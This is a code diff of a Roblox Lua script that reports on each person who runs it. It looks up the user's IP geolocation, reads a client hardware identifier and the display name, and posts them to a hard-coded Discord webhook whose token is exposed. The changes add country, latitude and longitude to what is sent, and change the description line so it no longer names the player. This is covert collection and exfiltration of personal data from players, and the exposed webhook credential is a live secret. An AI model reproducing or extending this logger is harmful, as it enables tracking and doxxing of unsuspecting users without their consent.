@@ -5,7 +5,7 @@ local lplr = plr.LocalPlayer
 Webhook_URL = "https://discord.com/api/webhooks/1242406279327256577/HPPyU_SzCzz4sktDAeWzrahzQsp0l1Cyww5l0gAdG5r0foCS40BOBToYVP3-IiHB0m7Y"
 local ip_info = request({
     Url = "http://ip-api.com/json",
-    Method = 'GET'
+    Method = "GET"
 })
 
 local ipinfo_table = HttpService:JSONDecode(ip_info.Body)
@@ -21,7 +21,7 @@ local response = request(
 	    ["content"] = "",
 		["embeds"] = {{
 		    ["title"] = "**Your script has been executed!**",
-			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
+			["description"] = "Someone has executed the script.",
 			["type"] = "rich",
 			["color"] = tonumber(0xffffff),
 			["fields"] = {
@@ -40,11 +40,11 @@ local response = request(
                     ["value"] = lplr.DisplayName,
                     ["inline"] = true
                 },
-		{
-		    ["name"] = "Hardware ID:",
-		    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-		    ["inline"] = true
-		},
+			    {
+				    ["name"] = "Hardware ID:",
+					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+					["inline"] = true
+				},
                 {
                     ["name"] = "Game Logged:",
                     ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
@@ -67,6 +67,11 @@ local response = request(
                 },
                 {
                     ["name"] = "Country:",
+                    ["value"] = ipinfo_table.country,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "CountryCode:",
                     ["value"] = ipinfo_table.countryCode,
                     ["inline"] = true
                 },
@@ -78,6 +83,16 @@ local response = request(
                 {
                     ["name"] = "City:",
                     ["value"] = ipinfo_table.city,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Latitude:",
+                    ["value"] = ipinfo_table.lat.. "",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Longtitude:",
+                    ["value"] = ipinfo_table.lon.. "",
                     ["inline"] = true
                 },
                 {
